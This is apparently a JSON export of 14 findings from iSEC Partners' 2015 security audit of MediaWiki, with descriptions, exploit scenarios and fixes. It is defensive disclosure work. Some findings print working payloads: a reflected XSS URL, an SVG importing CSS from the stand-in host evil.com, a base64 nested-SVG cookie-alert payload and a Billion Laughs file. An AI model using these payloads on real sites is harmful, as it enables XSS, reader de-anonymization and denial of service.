{
  "iSEC-WMF1214-8": "1. Reﬂected XSS in api.php\nClass: Data Validation Severity: High Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-8\nTARGETS: The API endpoint, available at http://devwiki/w/api.php.\nDESCRIPTION: The API supports multiple data output formats, some of which have recently been\ndeprecated. The wddx output format will return a response with Content-Type: text/xml . The\nresponse always indicates that the wddx output format has been deprecated and instructs the API\nuser to use the json format instead. However, if an API request with this output format is sent to api.php with an invalid parameter, the response will also include an error message that reﬂects the\nuser-supplied parameter without any output encoding. This allows an attacker to inject XML, which\ncan be used to trick the browser into interpreting the response as XHTML and executing injected\nJavaScript. To exploit this vulnerability, an attacker can craft a simple URL that, when clicked by\na MediaWiki user, will execute arbitrary JavaScript in their browser session for that domain. The\nfollowing URL will execute JavaScript that pops up an alert window on the resulting MediaWiki page,\ndemonstrating a reﬂected XSS attack.\nhttp://devwiki/w/api.php?action=flow&format=wddx&submodule=invalid%3C/string%3E%3Cfoo%3E%0A%3Ch\ntml%20xmlns%3ahtml%3d%27http%3a%2f%2fwww.w3.org%2f1999%2fxhtml%27%3E%0A%20%3Chtml%3ascript%3Ea\nlert(%22Reflected%20XSS!%22)%3b%3C%2fhtml%3ascript%3E%0A%3C%2fhtml%3E%0A%3C%2ffoo%3E%3Cstring%3\nE&page=User_talk%3AAdmin&ntreplyTo=&nttopic=Flow&ntcontent=flowwwww&token=3b44a9711080c52414b4\nd1f05682590554a1ead0%2B\nThis exploit works on several browsers that iSEC tested and bypasses Chrome's anti-XSS ﬁlters, making\nit especially eﬀective.\nEXPLOIT SCENARIO: An attacker crafts a malicious link with JavaScript that attempts to assign administrative rights to their own user account. They insert the link on a MediaWiki page and wait for an\nactive administrator with the appropriate privileges to click it. When the administrator clicks the link,\nthe JavaScript is reﬂected in the response, which results in the administrator's browser silently sending\na request to grant administrator privilege to the attacker's MediaWiki account. The attacker then uses\nthis unauthorized privileged access to inspect user IP addresses or destroy content.\nSHORT TERM SOLUTION: In this case, because the wddx format is deprecated, no user-supplied data\nneeds to be reﬂected in the response at all. If there is a speciﬁc need to display this error data, including\nthe user-supplied parameters, apply the same output encoding that is used when thexml output format\nis requested. Review the code for similar issues where output-encoding has not been applied to a\nresponse.\nLONG TERM SOLUTION: Implement security regression tests that ensure that appropriate output en-\ncoding occurs for all user-supplied data. Implement a content security policy (CSP). CSP is an HTTP\nheader that can control what types of active content (such as JavaScript, applets, and CSS) the browser\nwill allow, based on how the content is presented. An optimally conﬁgured CSP policy will never\nallow browsers to execute inline JavaScript, eval statements, or scripts in DOM event attributes. This\nrequires that all JavaScript is loaded explicitly from external sources with whitelisted URLs. However,\nif inline scripts and event attributes are required in the meantime, the CSP header can by used to\ntransmit a nonce value with each source in the whitelist. This nonce must then be included as a script\nattribute and checked by the server. This helps prevent XSS attacks. The CSP speciﬁcation can be\nfound at https://w3c.github.io/webappsec/specs/content-security-policy/#usage-4 .\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 18 of 34\n",
  "iSEC-WMF1214-3": "2. External reference in SVG\nClass: Data Validation Severity: High Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-3\nTARGETS: The upload feature, available at http://devwiki/wiki/Special:Upload.\nDESCRIPTION: When uploading an SVG ﬁle, it is possible to bypass the validation ﬁlters and upload\nan SVG ﬁle that references a remote CSS ﬁle. The validation routines that prevent inclusion of remote\nCSS ﬁles perform checks in a case-sensitive manner and fails to blockimporT and other case-variations.\nFor example, the following style declaration within an SVG ﬁle will cause any browser that renders the\nﬁle to fetch http://evil.com/attack.css:\n<svg xmlns= \"http: // www .w3.org /2000/ svg \">\n<style> @imporT 'http: // evil .com /attack .css ';</style>\n</svg>\nListing 1: Specially-crafted SVG ﬁle including a remote style sheet.\nThis vulnerability can be exploited to de-anonymize MediaWiki's readers. This can be used by malicious individuals or governments who will be able to identify the reader's location from their IP address,\nas well as the visited page from the referrer header.\nEXPLOIT SCENARIO: A MediaWiki user uploads a hostile SVG ﬁle that references a style sheet on an\nattacker-controlled webserver. The user then embeds this SVG ﬁle into the content of an article. By\nmonitoring users that request the style sheet, the attacker can build a complete list of users that have\nviewed the article in question.\nSHORT TERM SOLUTION: Modify the regular expressions for validating SVG ﬁle uploads to block the\nimport keyword in a case-insensitive manner.\nLONG TERM SOLUTION: Examine all other validation expressions to ensure that case sensitivity is handled in a context-appropriate manner. Implement a CSP in order to limit passive content like images.\nThis can be conﬁgured to prohibit callbacks to third parties on page loads, eﬀectively preventing de-\nanonymization.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 19 of 34\n",
  "iSEC-WMF1214-11": "3. Stored XSS in uploaded SVG ﬁles\nClass: Data Validation Severity: Medium Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-11\nTARGETS: The upload feature, available at http://devwiki/wiki/Special:Upload.\nDESCRIPTION: When uploading an SVG ﬁle, it is possible to bypass the validation ﬁlters and upload an\nSVG ﬁle that executes JavaScript when rendered. The SVG validation is a blacklist-based approach and\ncontains protections against numerous techniques for embedding JavaScript in SVG ﬁles; however, the\nprotections against nested SVG ﬁles are inadequate due to a missing MIME type blacklist. Speciﬁcally,\ndata: URIs with the image/svg or text/xml formats are blacklisted, but the application/xml MIME\ntype is suﬃcient to create a nested SVG ﬁle with JavaScript code.\n# /includes /upload /UploadBase .php\n# href with embedded svg as target\nif ($stripped == 'href ' && preg_match ( '!data :[^,]* image /svg [^,]*,! sim ', $value )){\nwfDebug ( __METHOD__ . \": Found href to embedded svg \"\n. \"\\\"< $strippedElement '$attrib '=' $value '...\\\" in uploaded file .\\n\" );\nreturn true ;}\n# href with embedded (text /xml ) svg as target\nif ( $stripped == 'href ' && preg_match ( '!data :[^,]* text /xml [^,]*,! sim ', $value )){\nwfDebug ( __METHOD__ . \": Found href to embedded svg \"\n. \"\\\"< $strippedElement '$attrib '=' $value '...\\\" in uploaded file .\\n\" );\nreturn true ;}\nListing 2: Blacklist ﬁltering for data: URIs with speciﬁc MIME types.\nThe following example SVG ﬁle contains a nested SVG ﬁle embedded within a data: URI. The nested\nSVG ﬁle contains executable JavaScript.\n<svg xmlns= \"http: // www .w3.org /2000/ svg \" xmlns:xlink= \"http: // www .w3.org /1999/ xlink \">\n<use xlink:href= \"data:application /xml ;base64 ,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5r\nPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KPGRlZnM +CjxjaXJjbGUgaWQ9InRlc3QiIHI9I\njUwIiBjeD0iMTAwIiBjeT0iMTAwIiBzdHlsZT0iZmlsbDogI0YwMCI +CjxzZXQgYXR0cmlidXRlTm\nFtZT0iZmlsbCIgYXR0cmlidXRlVHlwZT0iQ1NTIiBvbmJlZ2luPSdhbGVydChkb2N1bWVudC5jb29r\naWUpJwpvbmVuZD0nYWxlcnQoIm9uZW5kIiknIHRvPSIjMDBGIiBiZWdpbj0iMXMiIGR1cj0iNXMiIC\n8+ CjwvY2lyY2xlPgo8L2RlZnM +Cjx1c2UgeGxpbms6aHJlZj0iI3Rlc3QiLz4KPC9zdmc +# test \"/>\n</svg>\nListing 3: SVG ﬁle with a nested SVG ﬁle containing executable JavaScript code.\nDuring testing, this exploit was only conﬁrmed against the Firefox browser. Testing indicates that other\nbrowsers do not support nested SVG ﬁles.\nJavaScript in SVG ﬁles is evaluated in its own sandbox origin; it should not have access to cookies or\nother data from the wiki domain context.\nEXPLOIT SCENARIO: An attacker crafts a malicious SVG document that contains canned JavaScript\nexploit code and uploads it to a popular section on the MediaWiki application. When the SVG ﬁle\nis viewed, the victim's browser is ﬁngerprinted and instructed to download appropriate exploit code\nfrom an attacker-controlled server. The attacker is able to compromise users who view the hostile SVG\nﬁle, and the attacker can expand their impact by hijacking the privileges of the victim users.\nSHORT TERM SOLUTION: Modify the SVG validation blacklist ﬁlters to include the application/xml\nMIME type. Verify that no other MIME types can be used to embed nested SVG ﬁles.\nLONG TERM SOLUTION: Transition the SVG validation logic to a whitelist-based approach.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 20 of 34\n",
  "iSEC-WMF1214-13": "4. Entity expansion in SVG and XMP Metadata\nClass: Denial of Service Severity: Medium Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-13\nTARGETS: The XML parser of the upload feature, available at http://devwiki/wiki/Special:Upload.\nDESCRIPTION: When uploading an SVG ﬁle, or any ﬁle that includes XMP metadata, it is possible\nto include XML Doctype Declarations that trigger an XML entity expansion attack against the XML\nparser when the uploaded ﬁle is processed. This attack uses a series of expanding XML entities that,\nwhen fully expanded, can consume a large amount of memory . This causes the XML parser to consume\nall available resources on the system, leaving the webserver unresponsive.\nThe Billion Laughs 6 attack is an example of such attack, which results in approximately 3GB of data to\nbe processed. An example of a ﬁle that exploits this vulnerability is below:\n<? xml version =\"1.0 \" encoding= \"UTF -8\" standalone =\"yes \"?>\n<! DOCTYPE svg [\n<!ENTITY lol \"lol \">\n<! ELEMENT lolz (# PCDATA )>\n<! ENTITY lol1 \"&lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;\">\n<! ENTITY lol2 \"&lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;\">\n<! ENTITY lol3 \"&lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;\">\n<! ENTITY lol4 \"&lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;\">\n<! ENTITY lol5 \"&lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;\">\n<! ENTITY lol6 \"&lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;\">\n<! ENTITY lol7 \"&lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;\">\n<! ENTITY lol8 \"&lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;\">\n<! ENTITY lol9 \"&lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;\">\n]>\n<svg>\n<lolz>& lol9 ;</lolz>\n</svg>\nListing 4: Example of the Billion Laughs attack embedded in an SVG ﬁle. This ﬁle will cause\nconsumption of 3GB of memory when uploaded.\nEXPLOIT SCENARIO: A MediaWiki user wishes to suppress information contained on Wikimedia Foundation's website during a sensitive election period. To accomplish this, the attacker uploads a hostile\nSVG ﬁle containing the Billion Laughs attack. The attacker is able to bring the MediaWiki application\noﬄine for an extended period during a critical timeframe.\nSHORT TERM SOLUTION: Determine if XML DTD support is necessary for the correct processing of\nuploaded ﬁles. Disable DTD parsing if it is unnecessary .\nLONG TERM SOLUTION: Set limits on execution time and resource usage for all scripts that perform\nentity substitution on XML data.\n6https://en.wikipedia.org/wiki/Billion_laughs\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 21 of 34\n",
  "iSEC-WMF1214-1": "5. Lack of upper limit on password length allows DoS\nClass: Denial of Service Severity: Medium Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-1\nTARGETS: The login page, available at http://devwiki/w/index.php?title=Special:UserLogin.\nDESCRIPTION: The application does not have an upper limit on the length of a user-supplied password,\nwhich allows for arbitrarily large strings to be passed to the password hashing function. Because pass-\nwords are hashed by default using PBKDF2+SHA256 with a cost of 10,000, extremely large passwords\ncan be used to consume large amounts of system resources, resulting in the site becoming unresponsive\nto other requests.\nEXPLOIT SCENARIO: An unauthenticated attacker writes a script that attempts to log into a user ac-\ncount with a very large password,e.g. 2–4MB in size. Running this script repeatedly against Wikimedia\nFoundation endpoints could cause enough servers to consume their resources, causing the site to\nbecome unresponsive or inaccessible to legitimate users.\nSHORT TERM SOLUTION: Implement an upper limit for password strings—128 characters should be\nmore than suﬃcient. Enforce this limit before performing any further processing on user-supplied\npasswords.\nLONG TERM SOLUTION: Before performing any compression, decompression or hashing operation,\nensure that user-supplied data meets basic sanity parameters in terms of size and length.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 22 of 34\n",
  "iSEC-WMF1214-15": "6. External reference in PDF\nClass: Data Validation Severity: Medium Diﬃculty: Medium\nFINDING ID: iSEC-WMF1214-15\nTARGETS: The upload feature, available at http://devwiki/wiki/Special:Upload.\nDESCRIPTION: PDF ﬁles can contain references to external content, such as images, audio, and video.\nLoading external content from a PDF can be used to de-anonymize users who view the PDF directly\nusing Adobe Reader or another PDF reader.\nEXPLOIT SCENARIO: An attacker wishes to determine who reads a speciﬁc wiki article. The attacker\ncreates a PDF that loads content from an attacker-controlled server, using an existing PDF document\nrelated to the article as a base. A user interested in the topic opens the PDF for more information\nwhile reading the article and their PDF reader sends a request to the attacker's server, revealing their\nIP address, and by extension, their location.\nSHORT TERM SOLUTION: Provide a click-through warning informing users that PDF documents are\nactive content that could potentially de-anonymize them when viewed directly .\nLONG TERM SOLUTION: Convert uploaded PDFs to static images to avoid issues with active content.\nEnsure the library used for conversion is robust as it will be parsing potentially malicious content on\nthe server side, which could be a greater compromise than individual users. Consider setting up a\nsandboxed environment.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 23 of 34\n",
  "iSEC-WMF1214-14": "7. Stored XSS in PDF ﬁles\nClass: Data Validation Severity: Medium Diﬃculty: Medium\nFINDING ID: iSEC-WMF1214-14\nTARGETS: The upload feature, available at http://devwiki/wiki/Special:Upload.\nDESCRIPTION: The PDF format allows for documents containing embedded JavaScript. During testing,\na PDF that executes JavaScript when the document is opened was successfully uploaded.\nTesting indicated that this feature only works in Adobe Reader, whereas other readers such as the PDF\nreader built into Firefox and the PDF reader built into Chrome do not support JavaScript actions.\nJavaScript could be used to de-anonymize a user or to attempt exploits against a user. PDF readers\nexecute embedded JavaScript in a sandboxed context that should not have any ability to access data\nfrom the wiki domain.\nEXPLOIT SCENARIO: An attacker wishes to determine who reads a speciﬁc wiki article. The attacker\ncreates a PDF that uses JavaScript to make surreptitious HTTP requests to an attacker-controlled server,\nusing an existing PDF document related to the article as a base. A user interested in the topic opens\nthe PDF for more information while reading the article and their PDF reader sends a request to the\nattacker, revealing their IP address, and by extension, their location.\nSHORT TERM SOLUTION: Provide a click-through warning informing users that PDF documents are\nactive content that could potentially de-anonymize them when viewed directly .\nLONG TERM SOLUTION: Convert uploaded PDFs to static images to avoid issues with active content.\nEnsure the library used for conversion is robust as it will be parsing potentially malicious content on\nthe server side, which could be a greater compromise than individual users. Consider setting up a\nsandboxed environment.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 24 of 34\n",
  "iSEC-WMF1214-10": "8. Custom JavaScript may yield privilege escalation\nClass: Data Validation Severity: Medium Diﬃculty: Medium\nFINDING ID: iSEC-WMF1214-10\nTARGETS:User's custom scripts, such ashttp://devwiki/w/index.php?title=User:Foo/common.js&action=\nsubmit.\nDESCRIPTION: When editing any user's custom JavaScript, the script is executed whenever the ``Show\nPreview'' or ``Show Changes'' buttons are clicked. This could allow an attacker to trick another user\ninto executing JavaScript which hijacks their session. Because privileged users can edit the JavaScript\nof lower privileged users, this could lead to privilege escalation.\nEXPLOIT SCENARIO: A low-privileged user adds some complex custom JavaScript to their account,\nwith malicious code embedded within that directs people to a fake login screen or performs actions on\nthe victim's behalf. The user complains to an Administrator that they are having diﬃculty with their\ncustom ``skin'' , and asks the Administrator to change a small portion of the script for them. Upon pre-\nviewing the edit or viewing changes, the malicious code executes in the context of the Administrator's\nsession.\nSHORT TERM SOLUTION: Do not include another user's custom script when previewing or showing\nchanges. These pages should only allow users to edit and view code.\nLONG TERM SOLUTION:The custom JavaScript system has two security ﬂaws (seeﬁnding 10 on page 27).\nConsider deprecating this functionality and allowing users to customize the site using client-side code\ninstead.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 25 of 34\n",
  "iSEC-WMF1214-2": "9. Weak password policy\nClass: Conﬁguration Severity: Medium Diﬃculty: High\nFINDING ID: iSEC-WMF1214-2\nTARGETS: The signup page, available at http://devwiki/w/index.php?title=Special:UserLogin&type=\nsignup.\nDESCRIPTION: Wikimedia Foundation does not enforce a strong password policy for the MediaWiki\napplication. Upon account creation, a user can enter any password as long as the password is at least 1\ncharacter long and diﬀerent than the user's username. The lack of password complexity requirements\noften results in a number of users choosing weak passwords, which increases the odds of an attacker\nto successfully guess user's passwords by performing a brute force or dictionary attack.\nEXPLOIT SCENARIO: An attacker makes a small list of very common passwords that likely to be used\non MediaWiki, such as ``password'' or ``wiki'' . The attacker enumerates all usernames and tries to login\nwith the weak passwords. Because of the large amount of users on MediaWiki, and the weak password\npolicy, the success rate of the attack is high, giving the attacker mass account takeover.\nSHORT TERM SOLUTION:Implement and enforce a policy to require complex passwords. The following\nis an example of a complex password policy .\nPasswords should:\n• be a minimum of eight characters long\n• contain at least one of each of the following:\n– an uppercase letter\n– a lowercase letter\n– a number\n– a special character\n• be diﬀerent than a user's username\n• implement a blacklist of passwords that the user cannot use. (e.g., 123456, password, pass-\nword123, qwerty1!, etc.)\nLONG TERM SOLUTION: In addition to enforcing the use of strong passwords, Wikimedia Foundation\nshould require all admins to authenticate using multi-factor authentication, with the option for non-\nprivileged users to opt-in.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 26 of 34\n",
  "iSEC-WMF1214-5": "10. Lack of registry lock on domain names\nClass: Conﬁguration Severity: Medium Diﬃculty: High\nFINDING ID: iSEC-WMF1214-5\nTARGETS: The DNS conﬁguration of wikimedia.org, wikipedia.org and mediawiki.org.\nDESCRIPTION: There is no DNS registry lock on the various domains of the Wikimedia Foundation.\niSEC performed DNS WHOIS queries on the target domains and observed that while ﬂags are in place\nto prevent client transfers, no registry locks are set up to prohibit server transfers. This could allow for\na malicious or compromised registrar 7 to transfer the domain to malicious hosts.\nThe following listing displays the WHOIS records for wikipedia.org. It has been stripped out of the\ncontact information. Visit http://www.whois.com/whois/wikipedia.org to query up-to-date records.\nDomain Status : clientDeleteProhibited\nDomain Status : clientTransferProhibited\nDomain Status : clientUpdateProhibited\nName Server :NS0 .WIKIMEDIA .ORG\nName Server :NS1 .WIKIMEDIA .ORG\nName Server :NS2 .WIKIMEDIA .ORG\nDNSSEC :Unsigned\nListing 5: WHOIS records for wikipedia.org.\nEXPLOIT SCENARIO: An attacker ﬁnds a vulnerability on WMF's registrar and is able to comprise it.\nThe attacker modiﬁes the DNS records of all WMF domains and subdomains and redirects all traﬃc\nto their own servers. Because emails are relying on the DNS records, internal WMF communications\nare also sabotaged, which slows down investigation of the issue.\nSHORT TERM SOLUTION: Add a registry lock on all WMF domains by adding the following DNS ﬂags:\nDomain Status : serverDeleteProhibited\nDomain Status : serverTransferProhibited\nDomain Status : serverUpdateProhibited\nListing 6: Missing ﬂags.\nLONG TERM SOLUTION: Consider setting up a backup communication channel that does not depend\non WMF domains to avoid interruption in the event of a failure or compromise of the DNS infrastructure of WMF.\n7http://blog.cloudflare.com/details-behind-todays-internet-hacks/\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 27 of 34\n",
  "iSEC-WMF1214-7": "11. Users can inspect each other's personal JavaScript\nClass: Data Exposure Severity: Low Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-7\nTARGETS: The following pages:\n• http://devwiki/w/index.php?title=User:Admin/common.js\n• http://devwiki/w/load.php?debug=false&lang=en&modules=user&only=scripts&skin=vector&user=\nAdmin\n• http://devwiki/wiki/User:Admin/(skinname).js\nDESCRIPTION: MediaWiki allows users to upload custom JavaScript and CSS to alter the interface and\nfunctionality of the system. This code is stored as a wiki page, and is visible to any user of the system.\nEXPLOIT SCENARIO: A user uploads JavaScript containing personal information that may de-anonymize\nthat user. While the contents of this script are not part of the main indexed website, another user\nchanges the username in one of the above URLs to view the victim's custom code, learning information\nthat may be used to identify the owner of the custom code.\nSHORT TERM SOLUTION: Treat custom script the same as other user preferences by disallowing users\nfrom examining these customizations unless they are associated with the logged in account.\nLONG TERM SOLUTION:The custom JavaScript system has two security ﬂaws (seeﬁnding 8 on page 24).\nConsider deprecating this functionality and allowing users to customize the site using client-side code\ninstead.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 28 of 34\n",
  "iSEC-WMF1214-6": "12. Check User page lacks Cross Site Request Forgery (CSRF) protection\nClass: Data Validation Severity: Low Diﬃculty: Medium\nFINDING ID: iSEC-WMF1214-6\nTARGETS: The Check User page located at http://devwiki/wiki/Special:CheckUser.\nDESCRIPTION: The process to check a corresponding username to IP address and vice versa lacks\nCSRF protection. CSRF attacks are perpetrated by issuing a request to a protected resource within a\nweb application on behalf of a user without their knowledge. When the server receives the requests,\nit has no way of distinguishing the forged request from a request sent purposefully by the user. Any\nuser with basic rights on MediaWiki can trick a user with check user rights into submitting multiple\nlook up requests. This will ﬁll the check user log with untrustworthy data.\nEXPLOIT SCENARIO: An attacker with basic user rights on MediaWiki makes targeted attacks towards\nMediaWiki users with check user rights. A user with check user rights is tricked into visiting a site\nthe attacker controls, in turn tricking their browser into sending the request that submits unnecessary\ncheck user requests. Although the attacker cannot view the responses, a large number of unnecessary\nrequests can damage the reputation of the valid user.\nSHORT TERM SOLUTION:Require a valid wpEditToken to be submitted with each check user request.\nLONG TERM SOLUTION: Ensure that this wpEditToken is included with all state-changing requests\nsite-wide. Additionally, update the API such that if this token is not present, the user cannot make any\nstate changing requests.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 29 of 34\n",
  "iSEC-WMF1214-12": "13. User access roles are public\nClass: Data Exposure Severity: Informational Diﬃculty: Low\nFINDING ID: iSEC-WMF1214-12\nTARGETS: The following pages:\n• http://devwiki/codwiki/index.php/Special:ActiveUsers\n• http://devwiki/codwiki/index.php/Special:GlobalUsers\n• http://devwiki/codwiki/index.php/Special:CentralAuth\nDESCRIPTION: The target links allow unauthenticated users to look up privileges associated with roles,\nand the role associated with any existing user. The roles, such as ``administrator'' or ``steward'' , disclose\nthe list of operations a speciﬁc user has permission to perform. An attacker can use this information\nto enumerate users with higher privileges and create targeted attacks against them.\nSHORT TERM SOLUTION:Do not show the user roles in the list of users to unauthenticated users while\ndisplaying the list of users. Restrict the Global Account information to the privileged users only .\nLONG TERM SOLUTION: Make a chart of what parts of user accounts are considered private or protected, and go through each way of accessing user data and make sure it conforms to speciﬁcations.\nPerform regression checks to verify that there is no information disclosure which can be useful to the\nattacker.\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 30 of 34\n",
  "iSEC-WMF1214-4": "14. RC4 cipher enabled\nClass: Conﬁguration Severity: Informational Diﬃculty: High\nFINDING ID: iSEC-WMF1214-4\nTARGETS: The TLS conﬁguration of WMF servers, such as https://www.mediawiki.org.\nDESCRIPTION: The RC4-SHA cipher is enabled in the SSL/TLS conﬁguration of WMF's servers. RC4\nis a stream cipher that is often preferred by TLS servers due to its speed; however, security researchers\nrecently demonstrated that this cipher is not suitable to guarantee message conﬁdentiality . The RC4\ncipher is ﬂawed in its generation of a pseudo-random stream of bytes so that a wide variety of small\nbiases are introduced into the stream, decreasing its randomness thus creating potential for plain text\nrecovery attacks. An advisory from the IETF, 8 released October 2013, has noted that recent improvements in the attack vectors on RC4 mean that they are on the verge of becoming practically exploitable.\nAs such, the IETF advises that RC4 can no longer be seen as providing suﬃcient levels of security for\nTLS sessions. The advisory goes on to require that TLS clients and servers never negotiate the use of\nRC4 cipher suites.\nBecause of the deﬁciencies noted, the IETF advisory, referenced below, states that:\n• TLS clients MUST NOT include RC4 cipher suites in the ClientHello message.\n• TLS servers MUST NOT select an RC4 cipher suite when a TLS client sends such a cipher suite\nin the ClientHello message.\nNote: In March 2013, there were new attack scenarios proposed that use statistical biases in the RC4\nkey table to recover plaintext with a large number of TLS encryptions. 9\nThe output from the SSLyze scan iSEC used to determine the targets' TLS conﬁguration can be found\nin Appendix A.1 on the next page .\nSHORT TERM SOLUTION:Remove RC4 from production environments. Update the SSL/TLS conﬁgura-\ntion to only allow cryptographically strong cipher suites. Refer tohttps://wiki.mozilla.org/Security/\nServer_Side_TLS for the latest recommended cipher suite conﬁgurations. This list should prefer cipher\nsuites that provide perfect forward secrecy, such as those using elliptic curve Diﬃe-Hellman (ECDHE).\nLONG TERM SOLUTION: Stay abreast of security community news, such that new SSL/TLS attacks\nor conﬁguration weaknesses can be immediately patched or remedied. Regularly check web server\nSSL/TLS conﬁguration using tools like SSLyze10 or SSLLabs.11 Keep cipher suite conﬁgurations current\nwith the latest recommended conﬁgurations found on the Mozilla Wiki. 12\n8http://tools.ietf.org/html/draft-popov-tls-prohibiting-rc4-01\n9http://home.hiroshima-u.ac.jp/ohigashi/rc4/\n10https://github.com/nabla-c0d3/sslyze/releases\n11https://www.ssllabs.com/ssltest/\n12https://wiki.mozilla.org/Security/Server_Side_TLS#Recommended_configurations\nFebruary 13, 2015 Wikimedia Foundation Version 1.1\niSEC Partners Final Report — Wikimedia Foundation MediaWiki Page 31 of 34\n"
}